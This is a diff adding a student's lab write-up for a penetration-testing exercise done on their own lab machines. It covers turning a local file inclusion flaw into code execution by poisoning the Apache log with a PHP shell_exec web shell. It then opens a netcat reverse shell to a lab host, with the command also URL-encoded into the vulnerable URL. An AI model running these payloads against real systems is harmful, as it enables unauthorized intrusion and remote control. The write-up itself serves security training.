@@ -56,5 +56,16 @@ From there we can edit the field after `menu.php?file=` to any file we wish to r
 _(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_
 
 1.  Obtain code execution through the use of the LFI attack.
+- First, we make a malicious request to the server, injecting a PHP function that will execute the OS command
+`<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`
+(note the `<pre>` tag meaning the line will be saved in its preformatted state, ignore breaks and spaces)
+- We then simply navigate to the vulnerable URL and call our newly injected function
+`http://192.168.231.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`
+
 2.  Use the code execution to obtain a full shell.
+We can simply alter our URL to execute the following command:
+`nc -e cmd.exe 192.168.119.231 9001`
+the full URL would resemble the following:
+`http://192.168.231.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=nc%20-e%20cmd.exe%20192.168.119.231%209001`
+
 
